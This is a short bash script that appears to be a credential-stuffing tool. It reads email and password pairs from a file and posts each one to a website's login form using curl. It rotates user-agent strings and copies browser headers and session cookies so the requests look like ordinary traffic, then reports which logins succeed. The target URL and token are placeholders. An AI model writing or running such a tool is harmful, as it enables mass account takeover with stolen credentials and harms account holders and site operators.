#!/usr/bin/env bash
#Author: Matthew
#Version: 1.0

UAarray=('User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E238 Safari/601.1' 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36' 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36' 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko' 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1');

i=0

while IFS='' read -r line || [[ -n "$line" ]]; do
    userInfo=(${line//:/ })

    result=`curl -s -X POST '***WEBSITE URL***' -H "${UAarray[$(($i % 5))]}" -H 'Pragma: no-cache' -H 'Origin: ***WEBSITE URL***' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.8' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Cache-Control: no-cache' -H 'Referer: ***WEBSITE URL***' -H 'Cookie: ***COOKIE KEY***==; liveagent_oref=; liveagent_ptid=314ed78a-d51a-48f2-a356-4de665f4b89d; _soa_session_id=137b523b-95a5-4f19-9b65-91095c44e0e3; f5avrbbbbbbbbbbbbbbbb=HGFBNMGEFHFJJIGLEMJKLOHPJDIKNIEAHOHIINLMNBIDFAECOFHFANFLDEKAJHHDJJMAFCDNACDJKKFBOBLEDPMLCJJPBNAAIMJAJEMDGKLLKPCDDHFEFLPGPBDIIKCB; liveagent_sid=bac7918d-9a67-4ec1-8bb5-8cbb01c5bc1c; liveagent_vc=15' -H 'Connection: keep-alive' -H 'DNT: 1' --data "utf8=%E2%9C%93&authenticity_token=***TOKEN ID***&email=${userInfo[0]}&password=${userInfo[1]}&commit=Log+in" --compressed`

    i=$(($i+1))

    if [[ $result == *"***WEBSITE URL***"* ]]
    then
        echo "Result: FAIL, Username: ${userInfo[0]}, Password: ${userInfo[1]}"
    elif [[ $result == *"***WEBSITE URL***"* ]]
    then
        echo "Result: SUCCESS, Username: ${userInfo[0]}, Password: ${userInfo[1]}"
    else
        echo "Result: FAIL, Username: ${userInfo[0]}, Password: ${userInfo[1]}"
    fi
done < "$1"
